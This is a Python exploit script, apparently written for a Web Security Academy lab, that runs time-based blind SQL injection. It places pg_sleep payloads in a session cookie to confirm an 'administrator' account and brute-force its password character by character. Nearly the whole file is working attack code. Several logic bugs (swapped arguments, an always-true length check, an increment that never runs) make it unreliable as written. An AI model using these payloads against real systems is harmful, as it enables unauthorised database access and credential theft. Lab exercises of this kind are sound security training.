from bs4 import BeautifulSoup
import requests
import time

# LAB15 Blind SQL injection with time delays and information retrieval
# Author: AFANX
# 11/08/2024

def info(msg):
    print("[!] " + str(msg))

def error(msg):
    print("[-] " + str(msg))

def success(msg):
    print("[+] " + str(msg))

def send(payload, cookie=None):
    info(payload)
    if(cookie is None):
        response = requests.get(payload)
        info(response.status_code)
        return response
    else:
        cookies = {}
        cookies[cookie.split(":")[0]] = cookie.split(":")[1]
        response = requests.get(payload, cookies=cookies)
        info(response.status_code)
        return response

def recv_code(url, cookie=None):
    if(cookie is None):
        response = requests.get(url)
        return response.status_code
    else:
        cookies = {}
        cookies[cookie.split(":")[0]] = cookie.split(":")[1]
        response = requests.get(url, cookies=cookies)
        return response.status_code

def recv_cookies(url, domain):
    info(url)
    response = requests.get(url)
    cookie_dict = response.cookies.get_dict(domain=domain)
    found = ['%s=%s' % (name, value) for (name, value) in cookie_dict.items()]
    return ':'.join(found[0].split("="))

def url_encode(str_payload):
    url_encode_result = "+"
    for i in str_payload.split(" "):
        url_encode_result += i + '+'
    return url_encode_result[:len(url_encode_result)-1]

def response_time(time1, time2):
    return (int(time2.split(" ")[1].split(":")[2]) - int(time1.split(" ")[1].split(":")[2]))

def main():
    url = "https://0af600de03fdaddf819c1b9b005500d4.web-security-academy.net/"

    cookies = recv_cookies(url, "0af600de03fdaddf819c1b9b005500d4.web-security-academy.net")
    info("COOKIES: " + cookies)

    # step 0 -> check time response
    payload = cookies + url_encode("'%3BSELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE pg_sleep(0) END--")[1:]

    info(cookies + "\n")

    info("CHECK TIME RESPONSE")
    time1 = time.strftime("%Y-%m-%d %H:%M:%S")
    response = send(url, payload)
    time2 = time.strftime("%Y-%m-%d %H:%M:%S")

    if(response_time(time1, time2) >= 10):
        info("Time response is " + str(response_time(time1, time2)))

    print()

    # step 1 -> check username administrator
    info("CHECK USERNAME administrator")
    payload = cookies + url_encode("'%3BSELECT CASE WHEN (username='administrator') THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--")[1:]

    time1 = time.strftime("%Y-%m-%d %H:%M:%S")
    response = send(url, payload)
    time2 = time.strftime("%Y-%m-%d %H:%M:%S")
    # print(response_time(time1, time2))
    if(response_time(time1, time2) >= 10):
        info("Time response is " + str(response_time(time1, time2)))
        success("login: administrator")
    print()

    # step 2 -> find length
    info("FIND LENGTH")
    payload = cookies + url_encode("'%3BSELECT CASE WHEN (username='administrator' AND LENGTH(password)>20) THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--")[1:]

    time1 = time.strftime("%Y-%m-%d %H:%M:%S")
    response = send(url, payload)
    time2 = time.strftime("%Y-%m-%d %H:%M:%S")

    if(response_time(time1, time2) >= 0):
        info("Time response is " + str(response_time(time1, time2)))
        success("LENGHT: 20")

    print()

    # step 3 -> bruteforce password
    info("BRUTEFOCE PASSWORD")

    wordlist = ['0','1','2','3','4','5','6','7','8','9', 'a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z']
    count = 1
    flag = 0
    password = ""

    while(count != 21):
        for k in wordlist:
            payload = cookies + url_encode("'%3BSELECT CASE WHEN (username='administrator' AND SUBSTRING(password," + str(count) + ",1)='" + k + "') THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--")[1:]
            
            info(payload)

            time1 = time.strftime("%Y-%m-%d %H:%M:%S")
            response = send(url, payload)
            time2 = time.strftime("%Y-%m-%d %H:%M:%S")

            if(response_time(time1, time2) >= 10):
                password += k
                flag = 1
                success("PASSWORD: " + password)
                break 
            
            if(flag == 1):
                flag = 0
                count += 1
                break

    success("administrator:" + password)















    # soup = BeautifulSoup(response.text, "html.parser")

    # for i in soup.find_all('a'):
    #     if('Home' in i.text):
    #         success("Good request")
    #         break

if __name__ == "__main__":
    main()